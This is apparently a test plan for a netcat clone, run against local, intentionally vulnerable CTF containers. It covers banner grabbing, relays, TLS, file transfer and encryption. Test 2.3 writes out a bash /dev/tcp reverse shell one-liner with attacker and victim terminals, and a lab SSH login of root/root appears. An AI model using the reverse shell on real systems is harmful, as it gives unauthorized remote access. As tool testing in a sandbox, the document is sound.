# Netcat CTF Testing Plan

## Test Environment Setup

```bash
# Start CTF containers
docker compose -f docker-compose.ctf.yml up -d

# Verify containers are running
docker ps | grep ctf-
```

## Available Test Targets

| Container | IP | Port | Service | Use Case |
|-----------|-----|------|---------|----------|
| ctf-dvwa | 172.25.0.10 | 20888 | HTTP (DVWA) | Web testing, headers, banners |
| ctf-mysql | 172.25.0.12 | 23306 | MySQL 5.5 | Banner grabbing, TCP connect |
| ctf-ssh | 172.25.0.13 | 20022 | SSH | Banner grabbing, PTY testing |
| ctf-apache | 172.25.0.15 | 20890 | Apache 2.4 | HTTP testing, relay |
| ctf-nginx | 172.25.0.16 | 20891 | Nginx 1.10 | HTTP testing, proxy |
| ctf-redis | 172.25.0.17 | 26379 | Redis | TCP connect, data relay |
| ctf-mongodb | 172.25.0.18 | 27018 | MongoDB | TCP connect, banner grab |

---

## Test Suite 1: Basic TCP Connect & Banner Grabbing

### Test 1.1: MySQL Banner Grab
```bash
# Traditional netcat style
rb network nc connect 127.0.0.1 23306

# Expected: MySQL server version banner
# Example: "5.5.X-log"
```

### Test 1.2: SSH Banner Grab
```bash
rb network nc connect 127.0.0.1 20022

# Expected: SSH version string
# Example: "SSH-2.0-OpenSSH_X.X"
```

### Test 1.3: HTTP Request (Apache)
```bash
echo -e "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | rb network nc connect 127.0.0.1 20890

# Expected: HTTP/1.1 200 OK response with Apache headers
```

### Test 1.4: HTTP Request (Nginx)
```bash
echo -e "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | rb network nc connect 127.0.0.1 20891

# Expected: HTTP/1.1 200 OK response with Nginx headers
```

### Test 1.5: Redis PING
```bash
echo -e "*1\r\n\$4\r\nPING\r\n" | rb network nc connect 127.0.0.1 26379

# Expected: +PONG response
```

---

## Test Suite 2: Listen Mode & Reverse Connections

### Test 2.1: Simple TCP Listener
```bash
# Terminal 1: Start listener
rb network nc listen 0.0.0.0 19999

# Terminal 2: Connect and send data
echo "Hello from client" | nc 127.0.0.1 19999

# Expected: "Hello from client" appears in Terminal 1
```

### Test 2.2: HTTP Server Simulation
```bash
# Terminal 1: Listener with HTTP response
(echo -e "HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nHello, World!") | rb network nc listen 0.0.0.0 18080

# Terminal 2: Test with curl
curl http://127.0.0.1:18080

# Expected: "Hello, World!"
```

### Test 2.3: Reverse Shell (PTY Testing)
```bash
# Terminal 1 (Attacker): Start listener
rb network nc listen 0.0.0.0 14444 --pty

# Terminal 2 (Victim): Connect back
bash -c 'bash -i >& /dev/tcp/127.0.0.1/14444 0>&1'

# Expected: Interactive shell with proper TTY
# Test: echo $TERM, use arrow keys, try vim
```

---

## Test Suite 3: UDP Mode

### Test 3.1: UDP Echo Test
```bash
# Terminal 1: UDP listener
rb network nc listen 0.0.0.0 15555 --udp

# Terminal 2: Send UDP packet
echo "UDP test message" | nc -u 127.0.0.1 15555

# Expected: "UDP test message" in Terminal 1
```

### Test 3.2: DNS Query Simulation
```bash
# Send raw DNS query via UDP (manual packet crafting)
# This tests UDP connect mode
rb network nc connect 8.8.8.8 53 --udp < dns_query.bin

# Expected: DNS response bytes
```

---

## Test Suite 4: Relay/Proxy Mode

### Test 4.1: Port Forward (TCP Relay)
```bash
# Forward local port 18888 to DVWA
rb network nc relay 0.0.0.0 18888 172.25.0.10 80

# Test with curl
curl http://127.0.0.1:18888

# Expected: DVWA web page
```

### Test 4.2: Bidirectional Relay
```bash
# Relay between SSH and local port
rb network nc relay 0.0.0.0 12222 127.0.0.1 20022

# Connect via relay
ssh -p 12222 root@127.0.0.1
# (Password: root)

# Expected: SSH connection works through relay
```

### Test 4.3: Protocol Translation Relay
```bash
# HTTP -> Redis relay
rb network nc relay 0.0.0.0 16380 127.0.0.1 26379

# Send Redis commands via HTTP port
echo -e "*1\r\n\$4\r\nINFO\r\n" | nc 127.0.0.1 16380

# Expected: Redis INFO response
```

---

## Test Suite 5: TLS/SSL Connections

### Test 5.1: HTTPS Connection (DVWA - if TLS enabled)
```bash
rb network nc connect 172.25.0.10 443 --tls

# Expected: TLS handshake + encrypted connection
```

### Test 5.2: TLS Listener
```bash
# Terminal 1: TLS listener (requires cert generation)
rb network nc listen 0.0.0.0 14443 --tls --cert server.pem --key server.key

# Terminal 2: Connect with openssl
openssl s_client -connect 127.0.0.1:14443

# Expected: TLS handshake successful
```

---

## Test Suite 6: Broker Mode (Multi-Client Chat)

### Test 6.1: Simple Chat Server
```bash
# Terminal 1: Start broker
rb network nc broker 0.0.0.0 19090

# Terminal 2: Client 1
nc 127.0.0.1 19090
# Type: Hello from client 1

# Terminal 3: Client 2
nc 127.0.0.1 19090
# Type: Hello from client 2

# Expected: Both clients see each other's messages
```

### Test 6.2: Broadcast Test
```bash
# Start broker on port 19091
rb network nc broker 0.0.0.0 19091 --max-clients 5

# Connect 3+ clients
# Send messages from each
# Verify all receive broadcasts
```

---

## Test Suite 7: File Transfer

### Test 7.1: Upload File
```bash
# Terminal 1: Receive file
rb network nc listen 0.0.0.0 17777 > received_file.txt

# Terminal 2: Send file
cat /etc/hosts | rb network nc connect 127.0.0.1 17777

# Verify: diff /etc/hosts received_file.txt
```

### Test 7.2: Download File
```bash
# Terminal 1: Serve file
cat large_file.bin | rb network nc listen 0.0.0.0 17778

# Terminal 2: Download
rb network nc connect 127.0.0.1 17778 > downloaded_file.bin

# Verify: sha256sum large_file.bin downloaded_file.bin
```

---

## Test Suite 8: Proxy Support (SOCKS/HTTP)

### Test 8.1: SOCKS5 Proxy Connection
```bash
# Assuming SOCKS proxy at 127.0.0.1:1080
rb network nc connect 172.25.0.10 80 --proxy socks5://127.0.0.1:1080

# Expected: Connection through SOCKS proxy
```

### Test 8.2: HTTP CONNECT Proxy
```bash
rb network nc connect 172.25.0.10 443 --proxy http://127.0.0.1:8080

# Expected: Connection through HTTP proxy
```

---

## Test Suite 9: Advanced Features

### Test 9.1: Keep-Open Mode (Multiple Connections)
```bash
# Listener accepts multiple connections
rb network nc listen 0.0.0.0 19999 --keep-open

# Connect from multiple terminals
# All should be accepted sequentially
```

### Test 9.2: Timeout Testing
```bash
# 5-second timeout
rb network nc connect 172.25.0.10 80 --timeout 5

# Expected: Connection closes after 5s of inactivity
```

### Test 9.3: Source Port Binding
```bash
# Bind to specific source port
rb network nc connect 172.25.0.10 80 --source-port 12345

# Verify with tcpdump/wireshark
```

### Test 9.4: Zero-I/O Mode (Port Scanning)
```bash
# Quick port check (no data transfer)
rb network nc connect 172.25.0.12 23306 --zero

# Expected: Immediate connection test + exit
```

---

## Test Suite 10: Security & ACL

### Test 10.1: IP Allow List
```bash
# Only allow connections from 127.0.0.1
rb network nc listen 0.0.0.0 19999 --allow 127.0.0.1

# Try from localhost: should work
# Try from docker container IP: should fail
```

### Test 10.2: IP Deny List
```bash
# Deny specific IP
rb network nc listen 0.0.0.0 19999 --deny 172.25.0.10

# Connections from 172.25.0.10 should be rejected
```

---

## Test Suite 11: Encryption (Twofish - Cryptcat Mode)

### Test 11.1: Encrypted Connection
```bash
# Terminal 1: Encrypted listener
rb network nc listen 0.0.0.0 16666 --twofish --key "mysecret"

# Terminal 2: Encrypted client
echo "Encrypted message" | rb network nc connect 127.0.0.1 16666 --twofish --key "mysecret"

# Expected: Message decrypted correctly
```

### Test 11.2: Wrong Key Test
```bash
# Terminal 1: Listener with key1
rb network nc listen 0.0.0.0 16667 --twofish --key "key1"

# Terminal 2: Client with key2
echo "Test" | rb network nc connect 127.0.0.1 16667 --twofish --key "key2"

# Expected: Garbage/decryption failure
```

---

## Test Suite 12: Integration Tests (Real Scenarios)

### Test 12.1: MySQL Through SSH Tunnel
```bash
# Terminal 1: SSH tunnel with PTY
rb network nc listen 0.0.0.0 13306 --exec "rb network nc connect 172.25.0.12 3306"

# Terminal 2: Connect MySQL client
mysql -h 127.0.0.1 -P 13306 -u dvwa -p

# Expected: MySQL connection through tunnel
```

### Test 12.2: Web Scraping via Relay
```bash
# Relay to DVWA
rb network nc relay 0.0.0.0 18080 172.25.0.10 80

# Scrape with curl
curl http://127.0.0.1:18080 > dvwa_page.html

# Verify content
grep "DVWA" dvwa_page.html
```

### Test 12.3: Redis Proxy with Logging
```bash
# Relay with logging
rb network nc relay 0.0.0.0 16380 172.25.0.17 6379 --log redis_traffic.log

# Send commands
echo -e "SET testkey testvalue\r\n" | nc 127.0.0.1 16380

# Check log
cat redis_traffic.log
```

---

## Test Suite 13: Performance Tests

### Test 13.1: Large File Transfer
```bash
# Create 100MB file
dd if=/dev/urandom of=test_100mb.bin bs=1M count=100

# Transfer via netcat
time (cat test_100mb.bin | rb network nc connect 127.0.0.1 19999) &
rb network nc listen 0.0.0.0 19999 > received_100mb.bin

# Verify integrity
sha256sum test_100mb.bin received_100mb.bin
```

### Test 13.2: Throughput Test
```bash
# Send continuous data
dd if=/dev/zero bs=1M count=1000 | rb network nc connect 127.0.0.1 19999

# Measure with pv (pipe viewer)
dd if=/dev/zero bs=1M count=1000 | pv | rb network nc connect 127.0.0.1 19999
```

---

## Automated Test Script

Create `tests/run-netcat-tests.sh`:

```bash
#!/bin/bash

set -e

echo "🔧 Starting CTF environment..."
docker compose -f docker-compose.ctf.yml up -d
sleep 10

echo "✅ Running netcat tests..."

# Test 1: MySQL Banner
echo "Test 1: MySQL Banner"
timeout 2 rb network nc connect 127.0.0.1 23306 || true

# Test 2: SSH Banner
echo "Test 2: SSH Banner"
timeout 2 rb network nc connect 127.0.0.1 20022 || true

# Test 3: HTTP GET
echo "Test 3: HTTP GET"
echo -e "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n" | timeout 2 rb network nc connect 127.0.0.1 20890

# Test 4: Redis PING
echo "Test 4: Redis PING"
echo -e "*1\r\n\$4\r\nPING\r\n" | timeout 2 rb network nc connect 127.0.0.1 26379

echo "✅ All tests completed"

# Cleanup
docker compose -f docker-compose.ctf.yml down
```

---

## Success Criteria

Each test should verify:
- ✅ Connection established successfully
- ✅ Data transmitted correctly
- ✅ Proper error handling
- ✅ No memory leaks or crashes
- ✅ Performance within acceptable range
- ✅ Output matches expected format

---

## Notes

- All tests should run against LOCAL containers only (127.0.0.1)
- CTF containers are INTENTIONALLY vulnerable - DO NOT expose to internet
- Use `docker logs <container>` to debug connection issues
- Monitor with `tcpdump` for detailed packet inspection:
  ```bash
  sudo tcpdump -i any -nn -X port 23306
  ```
